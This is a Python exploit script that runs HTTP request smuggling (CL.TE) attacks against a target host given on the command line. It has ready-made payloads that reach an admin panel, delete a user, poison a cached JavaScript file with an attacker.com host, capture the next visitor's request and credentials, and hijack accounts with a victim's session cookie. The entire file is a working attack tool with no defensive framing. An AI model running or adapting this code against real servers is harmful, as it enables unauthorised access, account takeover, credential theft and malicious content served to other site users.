#!/usr/bin/env python3
import socket
import time
import argparse
from urllib.parse import urlparse

class AdvancedSmuggler:
    def __init__(self, target, port=80, ssl_enabled=False):
        self.target = target
        self.port = port
        self.ssl_enabled = ssl_enabled
    
    def create_connection(self):
        """Create socket connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if self.ssl_enabled:
            import ssl
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=self.target)
        
        sock.connect((self.target, self.port))
        return sock
    
    def send_and_receive(self, payload):
        """Send payload and receive response"""
        try:
            sock = self.create_connection()
            sock.sendall(payload.encode())
            
            response = b""
            start_time = time.time()
            
            while time.time() - start_time < 5:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error: {e}"
    
    def exploit_admin_access(self):
        """Exploit to access admin panel"""
        print("\n[*] Attempting to access /admin via smuggling...")
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response = self.send_and_receive(payload)
        
        if "admin" in response.lower() or "unauthorized" not in response.lower():
            print("[+] Possible admin access!")
            print(response[:500])
        else:
            print("[-] No admin access detected")
        
        return response
    
    def exploit_delete_user(self, username="carlos"):
        """Delete user via smuggled request"""
        print(f"\n[*] Attempting to delete user: {username}...")
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"87\r\n"
            f"GET /admin/delete?username={username} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response = self.send_and_receive(payload)
        
        if "deleted" in response.lower() or "success" in response.lower():
            print(f"[+] User {username} may have been deleted!")
        else:
            print("[-] Delete may have failed")
        
        print(response[:500])
        return response
    
    def exploit_web_cache_poison(self):
        """Cache poisoning attack"""
        print("\n[*] Attempting cache poisoning...")
        
        # First request - poison the cache
        poison_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5e\r\n"
            f"GET /static/include.js HTTP/1.1\r\n"
            f"Host: attacker.com\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        print("[*] Sending poison request...")
        self.send_and_receive(poison_payload)
        
        time.sleep(1)
        
        # Second request - check if poisoned
        check_payload = (
            f"GET /static/include.js HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"\r\n"
        )
        
        print("[*] Checking if cache was poisoned...")
        response = self.send_and_receive(check_payload)
        
        if "attacker.com" in response:
            print("[+] Cache successfully poisoned!")
        else:
            print("[-] Cache poisoning may have failed")
        
        print(response[:500])
        return response
    
    def exploit_credential_capture(self):
        """Capture credentials from next request"""
        print("\n[*] Setting up credential capture...")
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 200\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"POST /capture HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 800\r\n"
            f"\r\n"
            f"data="
        )
        
        response = self.send_and_receive(payload)
        print("[*] Capture request sent. Next user's request will be logged.")
        print(response[:500])
        return response
    
    def exploit_account_takeover(self, victim_session):
        """Take over account via session smuggling"""
        print(f"\n[*] Attempting account takeover with session: {victim_session}...")
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"7a\r\n"
            f"GET /my-account HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Cookie: session={victim_session}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        response = self.send_and_receive(payload)
        
        if "welcome" in response.lower() or "account" in response.lower():
            print("[+] Possible account access!")
        else:
            print("[-] Account takeover may have failed")
        
        print(response[:500])
        return response


def main():
    parser = argparse.ArgumentParser(description='HTTP Request Smuggling Exploiter')
    parser.add_argument('target', help='Target host (e.g., 192.168.1.1)')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-s', '--ssl', action='store_true', help='Use SSL/TLS')
    parser.add_argument('-e', '--exploit', choices=[
        'admin', 'delete', 'cache', 'capture', 'takeover', 'all'
    ], default='all', help='Exploitation technique')
    parser.add_argument('-u', '--username', default='carlos', help='Username for delete exploit')
    parser.add_argument('--session', help='Session cookie for takeover exploit')
    
    args = parser.parse_args()
    
    smuggler = AdvancedSmuggler(args.target, args.port, args.ssl)
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║      HTTP Request Smuggling Exploiter (CL.TE)               ║
║                                                              ║
║  Target: {args.target}:{args.port}                          
║  SSL: {args.ssl}                                            
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if args.exploit == 'admin' or args.exploit == 'all':
        smuggler.exploit_admin_access()
        time.sleep(2)
    
    if args.exploit == 'delete' or args.exploit == 'all':
        smuggler.exploit_delete_user(args.username)
        time.sleep(2)
    
    if args.exploit == 'cache' or args.exploit == 'all':
        smuggler.exploit_web_cache_poison()
        time.sleep(2)
    
    if args.exploit == 'capture' or args.exploit == 'all':
        smuggler.exploit_credential_capture()
        time.sleep(2)
    
    if args.exploit == 'takeover' and args.session:
        smuggler.exploit_account_takeover(args.session)


if __name__ == "__main__":
    main()